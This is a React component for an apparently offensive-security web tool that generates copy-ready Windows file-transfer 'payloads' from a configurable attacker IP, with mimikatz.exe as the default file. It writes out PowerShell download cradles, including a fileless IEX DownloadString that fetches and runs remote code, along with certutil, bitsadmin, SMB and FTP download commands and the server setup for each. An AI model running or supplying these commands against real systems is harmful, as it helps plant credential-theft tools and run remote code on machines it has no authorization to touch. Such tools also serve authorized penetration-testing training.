import React, { useState } from 'react';
import { Card, Button, Input, TabNav, PayloadBlock } from '../ui';
import { Folder, Copy, Check, Info, Server, Download, Upload } from 'lucide-react';

export default function FileTransferTool() {
    const [activeTab, setActiveTab] = useState('powershell');
    const [config, setConfig] = useState({
        ip: '212.212.111.222',
        port: '80',
        target_file: 'http://10.0.0.1/mimikatz.exe',
        output_file: 'mimikatz.exe',
    });
    const [showToast, setShowToast] = useState(false);

    const copyToClipboard = (text: string) => {
        navigator.clipboard.writeText(text);
        setShowToast(true);
        setTimeout(() => setShowToast(false), 2000);
    };

    const tabs = [
        { id: 'powershell', label: 'PowerShell' },
        { id: 'smb', label: 'SMB' },
        { id: 'ftp', label: 'FTP' },
        { id: 'certutil', label: 'Certutil/BITS' },
    ];

    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { name, value } = e.target;
        setConfig((prev) => ({ ...prev, [name]: value }));
    };

    return (
        <div className="space-y-6">
            <div>
                <h2 className="text-2xl font-black text-white flex items-center gap-2">
                    <Server className="text-htb-green" size={24} />
                    Windows File Transfer
                </h2>
                <p className="text-gray-400">
                    Generate file transfer payloads for Windows environments (SMB, FTP, PowerShell, Certutil)
                </p>
            </div>

            {/* Configuration Inputs */}
            <Card className="!p-6 space-y-4 border-l-4 border-l-htb-green">
                <h3 className="text-sm font-bold text-gray-300 uppercase tracking-wider flex items-center gap-2">
                    <Info size={16} /> Configuration
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="space-y-2">
                        <label className="text-xs font-medium text-gray-400">Attacker IP / Domain</label>
                        <Input
                            name="ip"
                            value={config.ip}
                            onChange={handleChange}
                            placeholder="e.g. 192.168.1.5"
                        />
                    </div>
                    <div className="space-y-2">
                        <label className="text-xs font-medium text-gray-400">Port</label>
                        <Input
                            name="port"
                            value={config.port}
                            onChange={handleChange}
                            placeholder="e.g. 80, 443, 8080"
                        />
                    </div>
                    <div className="space-y-2">
                        <label className="text-xs font-medium text-gray-400">Target File URL (Download Source)</label>
                        <Input
                            name="target_file"
                            value={config.target_file}
                            onChange={handleChange}
                            placeholder="Full URL to file"
                        />
                    </div>
                    <div className="space-y-2">
                        <label className="text-xs font-medium text-gray-400">Output Filename (On Target)</label>
                        <Input
                            name="output_file"
                            value={config.output_file}
                            onChange={handleChange}
                            placeholder="e.g. payload.exe"
                        />
                    </div>
                </div>
            </Card>

            <TabNav tabs={tabs} activeTab={activeTab} onTabChange={setActiveTab} />

            {/* PowerShell Tab */}
            {activeTab === 'powershell' && (
                <div className="space-y-4">
                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
                        <PayloadBlock
                            title="DownloadFile (Net.WebClient)"
                            content={`(New-Object Net.WebClient).DownloadFile('${config.target_file}','${config.output_file}')`}
                        />
                    </Card>

                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
                        <PayloadBlock
                            title="Fileless IEX (DownloadString)"
                            content={`IEX (New-Object Net.WebClient).DownloadString('${config.target_file}')`}
                        />
                    </Card>

                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
                        <PayloadBlock
                            title="Invoke-WebRequest (iwr)"
                            content={`iwr -Uri '${config.target_file}' -OutFile '${config.output_file}'`}
                        />
                    </Card>
                </div>
            )}

            {/* SMB Tab */}
            {activeTab === 'smb' && (
                <div className="space-y-4">
                    <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4">
                        <p className="text-sm text-blue-400 flex items-center gap-2">
                            <Info size={16} />
                            Start SMB Server: <code>sudo impacket-smbserver share -smb2support /tmp/smb_share</code>
                        </p>
                    </div>

                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
                        <PayloadBlock
                            title="Copy from SMB"
                            content={`copy \\\\${config.ip}\\share\\${config.output_file}`}
                        />
                    </Card>

                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
                        <PayloadBlock
                            title="Mount Share (Auth)"
                            content={`net use z: \\\\${config.ip}\\share /user:user password`}
                        />
                    </Card>
                </div>
            )}

            {/* FTP Tab */}
            {activeTab === 'ftp' && (
                <div className="space-y-4">
                    <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4">
                        <p className="text-sm text-blue-400 flex items-center gap-2">
                            <Info size={16} />
                            Start FTP Server: <code>python3 -m pyftpdlib -p 21 --write</code>
                        </p>
                    </div>

                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
                        <PayloadBlock
                            title="FTP Download Script"
                            content={`echo open ${config.ip} 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo GET ${config.output_file} >> ftp.txt
echo BYE >> ftp.txt
ftp -v -s:ftp.txt`}
                        />
                    </Card>
                </div>
            )}

            {/* Certutil Tab */}
            {activeTab === 'certutil' && (
                <div className="space-y-4">
                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
                        <PayloadBlock
                            title="Certutil Download"
                            content={`certutil -urlcache -split -f "${config.target_file}" ${config.output_file}`}
                        />
                    </Card>

                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
                        <PayloadBlock
                            title="BITSAdmin"
                            content={`bitsadmin /transfer myJob ${config.target_file} C:\\Windows\\Temp\\${config.output_file}`}
                        />
                    </Card>
                </div>
            )}

            {/* Toast Notification */}
            <div
                className={`fixed bottom-6 left-1/2 transform -translate-x-1/2 bg-[#0d1117] border-2 border-[#a2ff00] px-6 py-4 rounded-xl flex items-center gap-3 shadow-2xl shadow-[#a2ff00]/20 transition-all duration-300 ${showToast ? 'translate-y-0 opacity-100' : 'translate-y-20 opacity-0 pointer-events-none'}`}
                style={{ zIndex: 9999 }}
            >
                <div className="bg-[#a2ff00] rounded-full p-1.5 text-black">
                    <Check size={16} strokeWidth={3} />
                </div>
                <span className="font-bold text-sm text-white">Copied to clipboard!</span>
            </div>
        </div>
    );
}
